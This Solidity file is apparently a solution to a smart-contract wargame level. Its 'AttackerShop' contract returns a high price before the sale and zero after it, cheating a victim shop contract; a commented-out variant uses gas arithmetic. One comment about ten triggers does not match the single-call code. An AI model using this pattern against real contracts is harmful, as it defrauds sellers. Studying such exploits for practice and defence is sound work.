// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


interface IShop {
  function buy() external;
  

  function isSold() external view returns(bool);
}

interface IBuyer {
  function price() external view returns (uint);
}


contract AttackerShop is IBuyer{

    IShop victim;

    constructor(address _victim) {
        victim = IShop(_victim);
    }

    // Solution 1 found myself with gas analysis
    // function price() public view override returns(uint){
    //         return gasleft()-1035600;
    //     }

    //Solution 2: more effective and smarter idea found online but implemented myself
    function price() public view override returns(uint){
            return victim.isSold() ? 0 : 101;
        }
        
    function attack() public {
        //Needs to be triggered 10 times in 10 different blocks
        victim.buy();
    }
}